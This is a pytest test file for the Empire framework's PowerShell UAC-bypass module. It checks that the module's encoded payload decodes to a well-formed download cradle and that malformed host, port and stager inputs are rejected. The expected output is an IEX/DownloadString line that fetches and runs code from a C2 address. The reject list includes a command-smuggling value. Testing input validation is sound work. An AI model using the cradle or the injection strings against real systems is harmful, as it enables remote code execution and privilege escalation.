"""Generation tests for powershell/privesc/bypassuac_tokenmanipulation
(https://github.com/BC-SECURITY/Empire/issues/547): the -enc argument must be a
decodable UTF-16LE cradle for a well-formed URL, and bad input must fail at
generation time instead of yielding a broken payload.
"""

import base64
import re

import pytest

from empire.server.core.exceptions import ModuleValidationException

MODULE_ID = "powershell_privesc_bypassuac_tokenmanipulation"
ENC_ARG = re.compile(r'-Arguments "-w 1 -enc ([^"]*)"')


def _generate(main, **overrides):
    module = main.modulesv2.get_by_id(MODULE_ID)
    assert module is not None, f"module {MODULE_ID} not loaded"
    params = {opt.name: opt.value for opt in module.options}
    params.update({"Host": "10.0.0.5", "Port": "8080"})
    params.update(overrides)
    cls = main.modulesv2._load_custom_generate_class(module)
    # Positional, because @auto_get_source-decorated modules index args[3:5].
    return cls.generate(main, module, params, False, "")


def _cradle(main, **overrides):
    match = ENC_ARG.search(_generate(main, **overrides))
    assert match, "no -enc argument in generated script"
    assert match.group(1), "-enc argument is empty"
    return base64.b64decode(match.group(1), validate=True).decode("utf-16-le")


def test_bare_ip_gets_http_scheme(main):
    assert (
        _cradle(main)
        == "IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5:8080/update.php')"
    )


def test_host_with_scheme_is_kept(main):
    assert "'https://c2.example:8080/update.php'" in _cradle(
        main, Host="https://c2.example/"
    )


def test_leading_slash_in_stager_is_not_doubled(main):
    assert "'http://10.0.0.5:8080/update.php'" in _cradle(main, Stager="/update.php")


def test_powershell_metacharacters_in_stager_pass_through_verbatim(main):
    # The URL sits only in a single-quoted string, so $ is not expanded.
    assert (
        _cradle(main, Stager="a$b.php")
        == "IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5:8080/a$b.php')"
    )


@pytest.mark.parametrize(
    ("overrides", "url"),
    [
        ({"Host": "[::1]"}, "http://[::1]:8080/update.php"),
        ({"Host": "HTTPS://C2.example"}, "https://C2.example:8080/update.php"),
        ({"Host": " 10.0.0.5 ", "Port": " 8080 "}, "http://10.0.0.5:8080/update.php"),
        ({"Port": "65535"}, "http://10.0.0.5:65535/update.php"),
        ({"Port": 8080}, "http://10.0.0.5:8080/update.php"),
        ({"Stager": " update.php "}, "http://10.0.0.5:8080/update.php"),
    ],
)
def test_accepted_input_forms(main, overrides, url):
    assert f"'{url}'" in _cradle(main, **overrides)


@pytest.mark.parametrize(
    "overrides",
    [
        {"Port": "abc"},
        {"Port": "0"},
        {"Port": "65536"},
        {"Port": "\u00b2"},
        {"Port": "\u0668\u0660"},
        {"Host": ""},
        {"Host": "   "},
        {"Host": "10.0.0.5'"},
        {"Host": "10.0.0.5:8080"},
        {"Host": "10.0.0.5:abc"},
        {"Host": "http://c2.example:"},
        {"Host": "https://c2.example/stagers"},
        {"Host": "10.0.0.5?x=1"},
        {"Host": "10.0.0.5#f"},
        {"Host": "10.0.0.5;x"},
        {"Host": "10.0.0.5 evil"},
        {"Host": "u:p@10.0.0.5"},
        {"Host": "ftp://10.0.0.5"},
        {"Host": "http://"},
        {"Host": "https://"},
        {"Host": "."},
        {"Host": "[::1"},
        {"Stager": "update'.php"},
        {"Host": "c2.exa\tmple"},
        {"Host": "10.0.0\n.5"},
        {"Host": "\x01http://c2.example"},
        {"Stager": "x\u2019);calc;#"},
        {"Stager": "\ufeffupdate.php"},
        {"Stager": "a b.php"},
        {"Stager": "   "},
    ],
)
def test_bad_input_raises(main, overrides):
    with pytest.raises(ModuleValidationException):
        _generate(main, **overrides)
